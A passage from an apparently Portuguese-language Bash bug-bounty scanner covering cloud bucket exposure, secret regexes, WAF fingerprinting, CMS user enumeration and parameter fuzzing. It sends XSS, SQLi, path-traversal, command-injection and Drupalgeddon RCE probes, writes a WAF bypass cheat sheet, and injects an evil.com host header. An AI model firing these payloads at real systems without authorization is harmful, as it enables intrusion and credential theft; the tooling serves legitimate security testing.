            log_find "Azure Blob existe: ${az_url} [${az_code}]"
            # Tentar listar containers
            local az_list; az_list="$(http_get "${az_url}/?comp=list")"
            if echo "$az_list" | grep -q "EnumerationResults\|Container"; then
                add_finding "CRITICAL" "Azure Blob listável: ${blob}" \
                    "Containers Azure listáveis: ${az_url}" "cloud"
                echo "AZURE_LISTABLE|${az_url}" >> "$cloud_file"
            else
                echo "AZURE_EXISTS|${az_url}|${az_code}" >> "$cloud_file"
            fi
        fi
        rate_sleep
    done

    # ── Google Cloud Storage ──
    log_info "Testando GCS (Google Cloud Storage)..."
    local gcs_variants=("${base_name}" "${base_name}-assets" "${base_name}-backup")
    for gcs in "${gcs_variants[@]}"; do
        local gcs_url="https://storage.googleapis.com/${gcs}"
        local gcs_code; gcs_code="$(http_status "$gcs_url")"
        if [[ "$gcs_code" == "200" ]]; then
            local gcs_resp; gcs_resp="$(http_get "$gcs_url")"
            if echo "$gcs_resp" | grep -q "ListBucketResult\|<Contents>"; then
                add_finding "CRITICAL" "GCS Bucket Público: ${gcs}" \
                    "Bucket GCP listável: ${gcs_url}" "cloud"
                echo "GCS_LISTABLE|${gcs_url}" >> "$cloud_file"
            fi
        elif [[ "$gcs_code" == "403" ]]; then
            log_find "GCS bucket existe (403): ${gcs}"
        fi
        rate_sleep
    done

    # ── Firebase ──
    log_info "Testando Firebase databases expostos..."
    local fb_url="https://${base_name}-default-rtdb.firebaseio.com/.json"
    local fb_code; fb_code="$(http_status "$fb_url")"
    if [[ "$fb_code" == "200" ]]; then
        add_finding "CRITICAL" "Firebase DB exposto: ${base_name}" \
            "Database Firebase sem autenticação: ${fb_url}" "cloud"
        echo "FIREBASE_PUBLIC|${fb_url}" >> "$cloud_file"
    fi

    # ── DigitalOcean Spaces ──
    log_info "Testando DigitalOcean Spaces..."
    local do_regions=("nyc3" "sfo2" "ams3" "sgp1" "fra1")
    for region in "${do_regions[@]}"; do
        local do_url="https://${base_name}.${region}.digitaloceanspaces.com"
        local do_code; do_code="$(http_status "$do_url")"
        if [[ "$do_code" == "200" ]] || [[ "$do_code" == "403" ]]; then
            log_find "DO Space encontrado (${region}): ${do_url} [${do_code}]"
            echo "DO_SPACE|${do_url}|${do_code}" >> "$cloud_file"
        fi
        rate_sleep
    done

    log_info "Cloud Exposure concluído → ${cloud_file}"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 14 — SECRETS SCANNER (JS/HTML/Responses)
# ──────────────────────────────────────────────────────────────────────────────
module_secrets() {
    local tdir="$1"
    log_sect "MÓDULO: SCANNER DE SEGREDOS (JS/HTML/Configs)"

    local secrets_file="${tdir}/vulns/secrets_found.txt"
    : > "$secrets_file"

    local base_url="https://${DOMAIN}"
    local st; st="$(http_status "$base_url")"
    [[ "$st" == "000" ]] && base_url="http://${DOMAIN}"

    # Padrões de secrets — arrays paralelos (nome|regex)
    local sec_names=(
        "AWS Access Key"
        "GitHub Token"
        "Google API Key"
        "Slack Token"
        "Slack Webhook"
        "Stripe Live Key"
        "SendGrid Key"
        "Twilio SID"
        "JWT Token"
        "Private Key Header"
        "Password in URL"
        "DB Connection String"
        "Firebase Realtime DB"
        "Mailchimp API Key"
        "Generic api_key pattern"
        "Generic secret pattern"
        "Generic password pattern"
        "Bearer Token"
    )
    local sec_patterns=(
        'AKIA[0-9A-Z]{16}'
        'ghp_[0-9a-zA-Z]{36}'
        'AIza[0-9A-Za-z_-]{35}'
        'xox[baprs]-[0-9A-Za-z]{10,48}'
        'hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+'
        'sk_live_[0-9a-zA-Z]{24}'
        'SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}'
        'AC[a-z0-9]{32}'
        'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        '-----BEGIN.*PRIVATE KEY'
        '[a-z]+://[^:@/ ]{3,}:[^:@/ ]{3,}@'
        '(mysql|postgres|mongodb|redis)://[^ <>"]{10,}'
        '[a-z0-9-]+\.firebaseio\.com'
        '[0-9a-f]{32}-us[0-9]{1,2}'
        'api_key[=: ]+[A-Za-z0-9_-]{16,}'
        'secret[=: ]+[A-Za-z0-9_-]{16,}'
        'password[=: ]+[A-Za-z0-9_!@#$-]{8,}'
        'Bearer [A-Za-z0-9._~+/-]{20,}'
    )

    # URLs para escanear
    local scan_urls=("$base_url")

    # Adicionar URLs do Wayback se disponível
    if [[ -f "${tdir}/recon/wayback_urls.txt" ]]; then
        local wb_js; wb_js="$(grep -iE '\.js$' "${tdir}/recon/wayback_urls.txt" | head -10)"
        while IFS= read -r u; do
            [[ -n "$u" ]] && scan_urls+=("$u")
        done <<< "$wb_js"
    fi

    # Encontrar arquivos JS da página principal
    log_info "Coletando arquivos JavaScript..."
    local main_html; main_html="$(http_get "$base_url")"
    if [[ -n "$main_html" ]]; then
        # Extrair src de scripts
        while IFS= read -r js_src; do
            [[ -z "$js_src" ]] && continue
            if [[ "$js_src" =~ ^https?:// ]]; then
                scan_urls+=("$js_src")
            elif [[ "$js_src" =~ ^/ ]]; then
                scan_urls+=("${base_url}${js_src}")
            fi
        done < <(echo "$main_html" | grep -oiE 'src="[^"]+\.js[^"]*"' | grep -oiE '"[^"]+"' | tr -d '"' | head -30)
    fi

    # Arquivos estáticos comuns com segredos
    local static_paths=(
        "/config.js" "/app.js" "/main.js" "/bundle.js" "/app.bundle.js"
        "/static/js/main.js" "/assets/js/app.js" "/js/config.js"
        "/env.js" "/environment.js" "/settings.js" "/constants.js"
        "/.env" "/.env.js" "/config/database.yml" "/config/secrets.yml"
        "/wp-content/debug.log" "/storage/logs/laravel.log"
        "/application.yml" "/application.properties"
    )
    for sp in "${static_paths[@]}"; do
        local sp_url="${base_url}${sp}"
        local sp_code; sp_code="$(http_status "$sp_url")"
        [[ "$sp_code" == "200" ]] && scan_urls+=("$sp_url")
    done

    log_info "Escaneando ${#scan_urls[@]} recursos por segredos..."
    local total_secrets=0

    for scan_url in "${scan_urls[@]}"; do
        local content; content="$(http_get "$scan_url" 2>/dev/null)"
        [[ -z "$content" ]] && continue
        local url_short; url_short="$(echo "$scan_url" | cut -c1-80)"

        for idx in "${!sec_names[@]}"; do
            local secret_name="${sec_names[$idx]}"
            local pattern="${sec_patterns[$idx]}"
            local matches; matches="$(echo "$content" | grep -oiE "$pattern" | head -3)"
            if [[ -n "$matches" ]]; then
                add_finding "HIGH" "Segredo exposto: ${secret_name}" \
                    "Encontrado em: ${url_short}" "secrets"
                echo "SECRET|${secret_name}|${url_short}" >> "$secrets_file"
                echo "  Contexto: $(echo "$matches" | head -1 | cut -c1-50)..." >> "$secrets_file"
                ((total_secrets++))
            fi
        done

        rate_sleep
    done
    # Verificar comentários HTML com info sensível
    log_info "Escaneando comentários HTML por informações sensíveis..."
    if [[ -n "$main_html" ]]; then
        local html_comments; html_comments="$(echo "$main_html" | grep -oE '<!--.*?-->' | \
            grep -iE 'todo|fixme|hack|bug|password|debug|key|secret|api|token|internal|staging')"
        if [[ -n "$html_comments" ]]; then
            while IFS= read -r comment; do
                add_finding "MEDIUM" "Comentário HTML sensível" \
                    "$(echo "$comment" | cut -c1-100)" "secrets"
                echo "HTML_COMMENT|$(echo "$comment" | cut -c1-100)" >> "$secrets_file"
                ((total_secrets++))
            done <<< "$html_comments"
        fi
    fi

    log_info "Secrets scanner: ${total_secrets} segredos encontrados → ${secrets_file}"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 15 — WAF FINGERPRINT & BYPASS
# ──────────────────────────────────────────────────────────────────────────────
module_waf() {
    local tdir="$1"
    log_sect "MÓDULO: WAF FINGERPRINT & BYPASS"

    local waf_file="${tdir}/web/waf_analysis.txt"
    : > "$waf_file"

    local base_url="https://${DOMAIN}"
    local st; st="$(http_status "$base_url")"
    [[ "$st" == "000" ]] && base_url="http://${DOMAIN}"

    # ── Detecção de WAF por headers e comportamento ──
    log_info "Detectando presença de WAF..."
    local headers; headers="$(http_head "$base_url")"
    local detected_waf=""

    declare -A WAF_SIGS
    WAF_SIGS["Cloudflare"]="cf-ray|cloudflare|__cfduid|CF-Cache-Status"
    WAF_SIGS["Akamai"]="akamai|X-Check-Cacheable|X-Akamai"
    WAF_SIGS["AWS WAF/CloudFront"]="x-amz-cf-id|X-Cache.*CloudFront|x-amzn-requestid"
    WAF_SIGS["Imperva/Incapsula"]="incap_ses|visid_incap|X-Iinfo|x-cdn.*incapsula"
    WAF_SIGS["F5 BIG-IP ASM"]="TS[0-9a-f]{8}|BigIP|F5"
    WAF_SIGS["ModSecurity"]="mod_security|NOYB|X-Mod-Security"
    WAF_SIGS["Sucuri"]="x-sucuri-id|sucuri-"
    WAF_SIGS["Wordfence"]="wordfence"
    WAF_SIGS["Barracuda"]="barra_counter_session|BNI__BARRACUDA"
    WAF_SIGS["DDoS-Guard"]="ddos-guard"
    WAF_SIGS["Fastly"]="x-fastly-request-id|Fastly"
    WAF_SIGS["Varnish"]="X-Varnish|Via.*varnish"
    WAF_SIGS["Nginx"]="nginx"
    WAF_SIGS["Apache"]="Apache"
    WAF_SIGS["LiteSpeed"]="LiteSpeed"

    for waf_name in "${!WAF_SIGS[@]}"; do
        local sig="${WAF_SIGS[$waf_name]}"
        if echo "$headers" | grep -qiE "$sig"; then
            detected_waf="$waf_name"
            log_find "WAF/CDN detectado: ${WHITE}${waf_name}${RESET}"
            echo "WAF_DETECTED: $waf_name" >> "$waf_file"
            echo "SIGNATURE: $sig" >> "$waf_file"
            echo "" >> "$waf_file"
        fi
    done

    [[ -z "$detected_waf" ]] && log_warn "Nenhum WAF detectado nos headers"

    # ── Detecção por comportamento (payload de teste) ──
    log_info "Testando comportamento de WAF com payload de diagnóstico..."
    local test_payloads=(
        "?test=<script>alert(1)</script>"
        "?id=1' OR '1'='1"
        "?file=../../../etc/passwd"
        "?cmd=;ls -la"
        "?eval=phpinfo()"
    )

    for payload in "${test_payloads[@]}"; do
        local waf_code; waf_code="$(http_status "${base_url}/${payload}")"
        case "$waf_code" in
            403|406|429|444|501|999)
                log_find "WAF bloqueou payload ${payload} → HTTP ${waf_code}"
                echo "WAF_BLOCKED|${payload}|${waf_code}" >> "$waf_file"
                ;;
            200)
                log_warn "Payload não bloqueado: ${payload} → HTTP 200"
                echo "WAF_PASSED|${payload}|200" >> "$waf_file"
                ;;
        esac
        rate_sleep
    done

    # ── Técnicas de bypass (documental) ──
    log_info "Gerando técnicas de bypass para: ${detected_waf:-WAF genérico}..."
    local bypass_file="${tdir}/web/waf_bypass_techniques.txt"

    cat > "$bypass_file" << BYPASS_EOF
# WAF Bypass Techniques para: ${detected_waf:-Genérico}
# DOMÍNIO: ${DOMAIN}
# Gerado por BugBountyKit v${VERSION}

## 1. Case Variation
  ?id=1' Or '1'='1
  ?id=1' oR '1'='1
  <ScRiPt>alert(1)</sCrIpT>

## 2. URL Encoding
  %27 = '   %3C = <   %3E = >   %22 = "
  Duplo: %2527 = %27 = '
  ?id=1%27%20OR%20%271%27%3D%271

## 3. Unicode/HTML Encoding
  &#39; = '   &lt; = <   &gt; = >
  \u003c = <   \u003e = >

## 4. Comment Injection (SQLi)
  ?id=1'/**/OR/**/1=1--
  ?id=1'/*!OR*/1=1--

## 5. HTTP Header Bypass
  X-Forwarded-For: 127.0.0.1
  X-Real-IP: 127.0.0.1
  X-Originating-IP: 127.0.0.1
  X-Remote-IP: 127.0.0.1

## 6. Parameter Pollution
  ?id=1&id=<script>alert(1)</script>
  ?id[]=1&id[]=<script>

## 7. JSON/XML Encapsulation
  Content-Type: application/json
  {"id":"1' OR '1'='1"}

## 8. Chunked Transfer
  Transfer-Encoding: chunked
  (enviar payload em chunks)

## 9. Null Bytes
  ?id=1%00' OR '1'='1
  ?file=../etc/passwd%00.jpg

## 10. Path Normalization
  //admin
  /./admin
  /%61dmin (admin em hex)
BYPASS_EOF

    log_find "Técnicas de bypass salvas → ${bypass_file}"

    # ── IP Origin scan — tentar acessar IP diretamente ──
    log_info "Tentando identificar IP de origem por trás do WAF/CDN..."
    local origin_ip; origin_ip="$(resolve_ip "$DOMAIN")"
    if [[ -n "$origin_ip" ]]; then
        # Verificar se é IP de CDN conhecido
        local cdn_ranges=(
            "104.16." "104.17." "104.18." "104.19." "104.20." "104.21."  # Cloudflare
            "172.64." "172.65." "172.66." "172.67." "172.68."             # Cloudflare
            "141.101." "108.162." "190.93."                                # Cloudflare
            "205.251." "54.182." "52.84." "13.224." "13.35."              # CloudFront
            "23.235." "151.101." "199.27." "199.232."                     # Fastly
        )
        local is_cdn=false
        for range in "${cdn_ranges[@]}"; do
            if [[ "$origin_ip" == "${range}"* ]]; then
                is_cdn=true
                break
            fi
        done

        if [[ "$is_cdn" == "true" ]]; then
            log_find "IP ${origin_ip} é de CDN — origem mascarada"
            echo "CDN_IP: $origin_ip" >> "$waf_file"

            # Tentar cabeçalhos alternativos para descobrir origem
            log_info "Tentando descobrir IP real por headers X-Forwarded..."
            local origin_headers=(
                "X-Forwarded-Host: ${DOMAIN}.evil.com"
                "X-Forwarded-For: 127.0.0.1"
                "X-Host: ${DOMAIN}"
            )
            for ohdr in "${origin_headers[@]}"; do
                local r; r="$(curl -s -I -H "$ohdr" --max-time "$TIMEOUT" "$base_url" 2>/dev/null)"
                local loc; loc="$(echo "$r" | grep -i 'location:' | tr -d '\r')"
                [[ -n "$loc" ]] && log_find "Redirect por header: $loc"
            done
        else
            log_find "Possível IP real/origem: ${origin_ip}"
            echo "POSSIBLE_ORIGIN_IP: $origin_ip" >> "$waf_file"
        fi
    fi

    log_info "WAF analysis concluída → ${waf_file}"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 16 — CMS DEEP SCAN (WordPress / Drupal / Joomla)
# ──────────────────────────────────────────────────────────────────────────────
module_cms() {
    local tdir="$1"
    log_sect "MÓDULO: CMS DEEP SCAN"

    local base_url="https://${DOMAIN}"
    local st; st="$(http_status "$base_url")"
    [[ "$st" == "000" ]] && base_url="http://${DOMAIN}"

    local cms_file="${tdir}/web/cms_scan.txt"
    : > "$cms_file"

    local html; html="$(http_get "$base_url")"
    local detected_cms=""

    # ── Detectar CMS ──
    if echo "$html" | grep -qiE "wp-content|wp-includes|wordpress"; then
        detected_cms="wordpress"
    elif echo "$html" | grep -qiE "joomla|/components/com_"; then
        detected_cms="joomla"
    elif echo "$html" | grep -qiE "drupal|sites/default|Drupal\.settings"; then
        detected_cms="drupal"
    elif echo "$html" | grep -qiE "typo3|fileadmin|typolink"; then
        detected_cms="typo3"
    elif echo "$html" | grep -qiE "Powered by vBulletin|vbulletin"; then
        detected_cms="vbulletin"
    elif echo "$html" | grep -qiE "Magento|Mage\."; then
        detected_cms="magento"
    fi

    if [[ -z "$detected_cms" ]]; then
        log_warn "CMS não detectado — pulando módulo CMS específico"
        return 0
    fi

    log_find "CMS detectado: ${WHITE}${detected_cms}${RESET}"
    echo "CMS: $detected_cms" >> "$cms_file"

    # ════════════════════════════════════
    # WORDPRESS
    # ════════════════════════════════════
    if [[ "$detected_cms" == "wordpress" ]]; then
        log_info "Iniciando WordPress deep scan..."

        # Versão
        local wp_ver; wp_ver="$(echo "$html" | grep -oiE 'ver=[0-9]+\.[0-9.]+' | head -1 | cut -d= -f2)"
        [[ -z "$wp_ver" ]] && wp_ver="$(http_get "${base_url}/feed/" | grep -oiE '<generator>[^<]*</generator>' | grep -oiE '[0-9]+\.[0-9.]+')"
        if [[ -n "$wp_ver" ]]; then
            log_find "WordPress versão: ${wp_ver}"
            echo "WP_VERSION: $wp_ver" >> "$cms_file"
            add_finding "LOW" "WordPress versão exposta: ${wp_ver}" \
                "Versão do WP identificada, verificar CVEs para ${wp_ver}" "cms"
        fi

        # Enumeração de usuários via API REST
        log_info "Enumerando usuários WordPress..."
        local wp_users; wp_users="$(http_get "${base_url}/wp-json/wp/v2/users")"
        if [[ -n "$wp_users" ]] && echo "$wp_users" | grep -q '"id":'; then
            add_finding "MEDIUM" "WordPress Users API exposta" \
                "Lista de usuários acessível via REST API" "cms"
            echo "WP_USERS_API: exposed" >> "$cms_file"
            # Extrair logins
            echo "$wp_users" | grep -oE '"slug":"[^"]*"' | cut -d'"' -f4 | while read -r u; do
                log_find "WP Usuário: ${u}"
                echo "WP_USER: $u" >> "$cms_file"
            done
        fi

        # Enumeração via author redirect
        log_info "Testando enumeração de usuários via ?author=..."
        for i in {1..5}; do
            local author_resp; author_resp="$(http_head "${base_url}/?author=${i}")"
            local author_loc; author_loc="$(echo "$author_resp" | grep -i location | grep -oiE '/author/[^/]+/' | head -1)"
            if [[ -n "$author_loc" ]]; then
                local username; username="$(echo "$author_loc" | sed 's|/author/||;s|/||')"
                log_find "WP Usuário (author enum): ${username}"
                echo "WP_USER_AUTHOR: $username" >> "$cms_file"
            fi
        done

        # xmlrpc.php
        local xmlrpc_code; xmlrpc_code="$(http_status "${base_url}/xmlrpc.php")"
        if [[ "$xmlrpc_code" == "200" ]] || [[ "$xmlrpc_code" == "405" ]]; then
            add_finding "MEDIUM" "WordPress xmlrpc.php exposto" \
                "xmlrpc.php ativo — brute-force amplificado possível" "cms"
            echo "WP_XMLRPC: exposed" >> "$cms_file"
        fi

        # Arquivo readme / license
        for wfile in "readme.html" "license.txt" "wp-config.php.bak" "wp-config.bak" \
                     ".wp-config.php.swp" "wp-config.php~"; do
            local wf_code; wf_code="$(http_status "${base_url}/${wfile}")"
            if [[ "$wf_code" == "200" ]]; then
                add_finding "MEDIUM" "Arquivo WP exposto: ${wfile}" \
                    "${base_url}/${wfile}" "cms"
                echo "WP_FILE: $wfile" >> "$cms_file"
            fi
        done

        # Debug log
        local debug_code; debug_code="$(http_status "${base_url}/wp-content/debug.log")"
        if [[ "$debug_code" == "200" ]]; then
            add_finding "HIGH" "WordPress debug.log exposto" \
                "${base_url}/wp-content/debug.log" "cms"
        fi

        # Upload directory listing
        local upload_resp; upload_resp="$(http_get "${base_url}/wp-content/uploads/")"
        if echo "$upload_resp" | grep -qiE "Index of|Parent Directory"; then
            add_finding "HIGH" "Directory listing em wp-content/uploads/" \
                "Arquivos enviados publicamente listáveis" "cms"
        fi

        # Plugins comuns vulneráveis
        log_info "Testando plugins WordPress conhecidos..."
        local vuln_plugins=(
            "contact-form-7" "woocommerce" "elementor" "yoast-seo"
            "wordfence" "akismet" "jetpack" "wpforms-lite"
            "advanced-custom-fields" "really-simple-ssl"
            "wp-file-manager" "wp-super-cache" "w3-total-cache"
            "duplicator" "all-in-one-seo-pack" "revslider"
            "gravityforms" "nextgen-gallery" "timthumb"
        )
        for plugin in "${vuln_plugins[@]}"; do
            local plug_code; plug_code="$(http_status "${base_url}/wp-content/plugins/${plugin}/readme.txt")"
            if [[ "$plug_code" == "200" ]]; then
                local plug_ver; plug_ver="$(http_get "${base_url}/wp-content/plugins/${plugin}/readme.txt" | \
                    grep -iE 'Stable tag:|Version:' | head -1 | grep -oE '[0-9]+\.[0-9.]+')"
                log_find "Plugin ativo: ${plugin} ${plug_ver:+(v$plug_ver)}"
                echo "WP_PLUGIN: $plugin${plug_ver:+ v$plug_ver}" >> "$cms_file"
            fi
        done

    # ════════════════════════════════════
    # JOOMLA
    # ════════════════════════════════════
    elif [[ "$detected_cms" == "joomla" ]]; then
        log_info "Iniciando Joomla deep scan..."

        # Versão
        local joomla_ver; joomla_ver="$(http_get "${base_url}/administrator/manifests/files/joomla.xml" | \
            grep -oiE '<version>[^<]*</version>' | grep -oiE '[0-9]+\.[0-9.]+')"
        [[ -n "$joomla_ver" ]] && {
            log_find "Joomla versão: ${joomla_ver}"
            add_finding "LOW" "Joomla versão exposta: ${joomla_ver}" "" "cms"
        }

        # Arquivos sensíveis
        for jfile in "configuration.php.bak" "configuration.php~" \
                     "administrator/logs/" "cache/"; do
            local jf_code; jf_code="$(http_status "${base_url}/${jfile}")"
            [[ "$jf_code" == "200" ]] && {
                add_finding "HIGH" "Arquivo Joomla exposto: ${jfile}" "" "cms"
                echo "JOOMLA_FILE: $jfile" >> "$cms_file"
            }
        done

        # API Joomla
        local japi; japi="$(http_status "${base_url}/api/index.php/v1/users")"
        [[ "$japi" == "200" ]] && add_finding "HIGH" "Joomla API users exposta" "" "cms"

    # ════════════════════════════════════
    # DRUPAL
    # ════════════════════════════════════
    elif [[ "$detected_cms" == "drupal" ]]; then
        log_info "Iniciando Drupal deep scan..."

        # Versão
        local drupal_ver; drupal_ver="$(http_get "${base_url}/CHANGELOG.txt" | head -3 | \
            grep -oiE 'Drupal [0-9]+\.[0-9.]+')"
        [[ -n "$drupal_ver" ]] && {
            log_find "$drupal_ver"
            add_finding "MEDIUM" "Drupal CHANGELOG.txt exposto — versão visível" "" "cms"
        }

        # Drupalgeddon check (CVE-2018-7600 / CVE-2018-7602)
        local dg_resp; dg_resp="$(http_status "${base_url}/?q=user/password&name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup")"
        [[ "$dg_resp" == "200" ]] && add_finding "CRITICAL" "Possível Drupalgeddon (CVE-2018-7600)" \
            "Drupal RCE payload não bloqueado" "cms"

        # Arquivos sensíveis Drupal
        for dfile in "CHANGELOG.txt" "INSTALL.txt" "README.txt" \
                     "sites/default/settings.php" "sites/default/files/"; do
            local df_code; df_code="$(http_status "${base_url}/${dfile}")"
            [[ "$df_code" == "200" ]] && {
                add_finding "MEDIUM" "Arquivo Drupal exposto: ${dfile}" "" "cms"
                echo "DRUPAL_FILE: $dfile" >> "$cms_file"
            }
        done

    # ════════════════════════════════════
    # MAGENTO
    # ════════════════════════════════════
    elif [[ "$detected_cms" == "magento" ]]; then
        log_info "Iniciando Magento deep scan..."

        for mgpath in "admin" "backend" "manager" "adminpanel"; do
            local mg_code; mg_code="$(http_status "${base_url}/${mgpath}")"
            [[ "$mg_code" == "200" ]] && {
                add_finding "HIGH" "Painel Magento acessível: /${mgpath}" "" "cms"
            }
        done

        local mg_info; mg_info="$(http_status "${base_url}/magento_version")"
        [[ "$mg_info" == "200" ]] && add_finding "MEDIUM" "Magento versão exposta" \
            "${base_url}/magento_version" "cms"
    fi

    log_info "CMS deep scan concluído → ${cms_file}"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 17 — NETWORK INTEL (Traceroute / IPv6 / CDN / BGP)
# ──────────────────────────────────────────────────────────────────────────────
module_network() {
    local tdir="$1"
    log_sect "MÓDULO: NETWORK INTELLIGENCE"

    local net_file="${tdir}/recon/network_intel.txt"
    : > "$net_file"

    local ip; ip="$(resolve_ip "$DOMAIN")"
    [[ -z "$ip" ]] && { log_warn "IP não resolvido"; return 0; }

    # ── IPv6 check ──
    log_info "Verificando suporte IPv6..."
    local ipv6=""
    if check_cmd dig; then
        ipv6="$(dig +short AAAA "$DOMAIN" 2>/dev/null | head -1)"
    fi
    if [[ -n "$ipv6" ]]; then
        log_find "IPv6: ${ipv6}"
        echo "IPV6: $ipv6" >> "$net_file"
        # Testar acesso via IPv6
        local ipv6_code; ipv6_code="$(curl -s -o /dev/null -w "%{http_code}" \
            --max-time "$TIMEOUT" -6 "https://${DOMAIN}" 2>/dev/null || echo 000)"
        log_find "Acesso IPv6: HTTP ${ipv6_code}"
    else
        log_warn "IPv6 não configurado para ${DOMAIN}"
        echo "IPV6: not configured" >> "$net_file"
    fi

    # ── Traceroute ──
    log_info "Executando traceroute..."
    if check_cmd traceroute; then
        local trace; trace="$(traceroute -n -m 15 -w 2 "$ip" 2>/dev/null | head -20)"
        echo "=== TRACEROUTE ===" >> "$net_file"
        echo "$trace" >> "$net_file"
        local hops; hops="$(echo "$trace" | grep -c "^[[:space:]]*[0-9]")"
        log_find "Traceroute: ${hops} hops até ${ip}"
    elif check_cmd tracepath; then
        local tp; tp="$(tracepath -n "$ip" 2>/dev/null | head -15)"
        echo "$tp" >> "$net_file"
        log_find "Tracepath executado"
    fi

    # ── CDN Detection ──
    log_info "Identificando CDN/Hosting provider..."
    local headers; headers="$(http_head "https://${DOMAIN}" 2>/dev/null || http_head "http://${DOMAIN}")"
    local cdn_name="Desconhecido"

    if echo "$headers" | grep -qi "cf-ray\|cloudflare"; then
        cdn_name="Cloudflare"
    elif echo "$headers" | grep -qi "x-amz-cf\|CloudFront"; then
        cdn_name="AWS CloudFront"
    elif echo "$headers" | grep -qi "fastly\|x-fastly"; then
        cdn_name="Fastly"
    elif echo "$headers" | grep -qi "akamai\|x-akamai\|x-check-cacheable"; then
        cdn_name="Akamai"
    elif echo "$headers" | grep -qi "x-cdn.*incapsula\|incap_ses"; then
        cdn_name="Imperva Incapsula"
    elif echo "$headers" | grep -qi "x-azure-ref\|azure"; then
        cdn_name="Microsoft Azure CDN"
    elif echo "$headers" | grep -qi "x-cache.*varnish\|Via.*varnish"; then
        cdn_name="Varnish Cache"
    elif echo "$headers" | grep -qi "via.*nginx\|x-nginx"; then
        cdn_name="Nginx"
    fi

    log_find "CDN/Hosting: ${WHITE}${cdn_name}${RESET}"
    echo "CDN: $cdn_name" >> "$net_file"

    # ── BGP / Prefixo ──
    log_info "Consultando informações BGP..."
    local bgp_data; bgp_data="$(http_get "https://api.hackertarget.com/aslookup/?q=${ip}" 2>/dev/null)"
    if [[ -n "$bgp_data" ]] && ! echo "$bgp_data" | grep -qi "error"; then
        log_find "BGP/ASN: $bgp_data"
        echo "BGP: $bgp_data" >> "$net_file"
    fi

    # ── Reverse DNS ──
    log_info "Reverse DNS lookup..."
    local rdns=""
    if check_cmd dig; then
        local rev_ip; rev_ip="$(echo "$ip" | awk -F. '{print $4"."$3"."$2"."$1}')"
        rdns="$(dig +short PTR "${rev_ip}.in-addr.arpa" 2>/dev/null | head -1)"
    fi
    if [[ -n "$rdns" ]]; then
        log_find "Reverse DNS: ${ip} → ${rdns}"
        echo "RDNS: $rdns" >> "$net_file"
        # Se rDNS diferente do domínio, pode indicar hosting compartilhado
        if ! echo "$rdns" | grep -qi "$DOMAIN"; then
            log_warn "rDNS aponta para domínio diferente — possível hosting compartilhado"
            echo "SHARED_HOSTING_POSSIBLE: $rdns" >> "$net_file"
        fi
    fi

    # ── Shared Hosting Detection — outros domínios no mesmo IP ──
    log_info "Verificando hosting compartilhado..."
    local shared_domains; shared_domains="$(http_get "https://api.hackertarget.com/reverseiplookup/?q=${ip}" 2>/dev/null)"
    if [[ -n "$shared_domains" ]] && ! echo "$shared_domains" | grep -qi "error\|no records"; then
        local shared_count; shared_count="$(echo "$shared_domains" | wc -l)"
        if (( shared_count > 1 )); then
            log_find "Hosting compartilhado: ${shared_count} domínios no mesmo IP"
            echo "$shared_domains" > "${tdir}/recon/shared_hosting.txt"
            add_finding "INFO" "Hosting compartilhado detectado: ${shared_count} domínios" \
                "IP ${ip} compartilhado com outros sites" "network"
        fi
    fi

    # ── MTR-style latency ──
    log_info "Testando latência e estabilidade..."
    if check_cmd ping; then
        local ping_result; ping_result="$(ping -c 5 -W 2 "$ip" 2>/dev/null | tail -2)"
        echo "PING: $ping_result" >> "$net_file"
        local avg_ms; avg_ms="$(echo "$ping_result" | grep -oE 'avg.*' | grep -oE '[0-9]+\.[0-9]+' | head -1)"
        [[ -n "$avg_ms" ]] && log_find "Latência média: ${avg_ms}ms"
    fi

    log_info "Network Intel concluído → ${net_file}"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 18 — PARAM FUZZING AVANÇADO
# ──────────────────────────────────────────────────────────────────────────────
module_fuzzing() {
    local tdir="$1"
    log_sect "MÓDULO: PARAMETER FUZZING AVANÇADO"

    local fuzz_file="${tdir}/web/fuzzing_results.txt"
    : > "$fuzz_file"

    local base_url="https://${DOMAIN}"
    local st; st="$(http_status "$base_url")"
    [[ "$st" == "000" ]] && base_url="http://${DOMAIN}"

    # ── Coletar parâmetros reais da aplicação ──
    log_info "Coletando parâmetros da aplicação..."
    local all_params=()
    local html; html="$(http_get "$base_url")"

    # Extrair parâmetros de links e forms
    while IFS= read -r param; do
        [[ -n "$param" ]] && all_params+=("$param")
    done < <(echo "$html" | \
        grep -oiE '(name|id)="[^"]{1,30}"' | \
        cut -d'"' -f2 | \
        grep -vE '^(submit|button|checkbox|radio|hidden)$' | \
        sort -u | head -30)

    # Parâmetros padrão se não encontrar nenhum
    if [[ ${#all_params[@]} -eq 0 ]]; then
        all_params=("id" "q" "search" "page" "type" "cat" "name" "user" "file" \
                    "action" "view" "lang" "ref" "token" "key" "data" "order")
    fi

    log_find "Parâmetros para testar: ${#all_params[@]}"

    # ── IDOR Testing ──
    log_info "Testando IDOR (Insecure Direct Object Reference)..."
    local idor_payloads=("0" "1" "2" "3" "99" "100" "1000" "-1" "null" \
                         "undefined" "true" "false" "admin" "root" \
                         "00000000-0000-0000-0000-000000000001")
    for param in "${all_params[@]}"; do
        local baseline; baseline="$(http_get "${base_url}/?${param}=BASELINE_X9Z_NOTEXIST" 2>/dev/null)"
        local baseline_len=${#baseline}

        for payload in "${idor_payloads[@]}"; do
            local resp; resp="$(http_get "${base_url}/?${param}=${payload}" 2>/dev/null)"
            local resp_len=${#resp}
            local diff=$(( resp_len - baseline_len ))
            # Se a resposta for significativamente maior, pode ter retornado dados
            if (( diff > 500 )) && ! echo "$resp" | grep -qiE "not found|error|invalid"; then
                log_find "IDOR candidato: ${param}=${payload} (resposta +${diff} bytes)"
                echo "IDOR_CANDIDATE|${param}=${payload}|diff:${diff}" >> "$fuzz_file"
                add_finding "MEDIUM" "IDOR candidato: ?${param}=${payload}" \
                    "Resposta ${diff} bytes maior que baseline" "fuzzing"
            fi
        done
    done

    # ── HTTP Parameter Pollution ──
    log_info "Testando HTTP Parameter Pollution (HPP)..."
    for param in "${all_params[@]:0:5}"; do
        local hpp_url="${base_url}/?${param}=normal&${param}=<script>alert(1)</script>"
